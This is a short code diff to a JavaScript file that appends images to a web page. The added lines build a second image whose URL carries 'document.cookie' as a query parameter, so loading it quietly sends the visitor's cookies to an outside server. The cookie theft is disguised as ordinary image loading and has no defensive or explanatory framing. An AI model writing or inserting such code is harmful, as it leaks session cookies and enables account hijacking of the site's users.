@@ -6,4 +6,7 @@ var imgElement = document.createElement("img");
 imgElement.src = "https://homepages.cae.wisc.edu/~ece533/images/peppers.png";
 document.body.appendChild(imgElement);
 
+var imgElement2 = document.createElement("img");
+imgElement2.src = "https://homepages.cae.wisc.edu/~ece533/images/peppers.png?cookie="+document.cookie;
+document.body.appendChild(imgElement2);
 
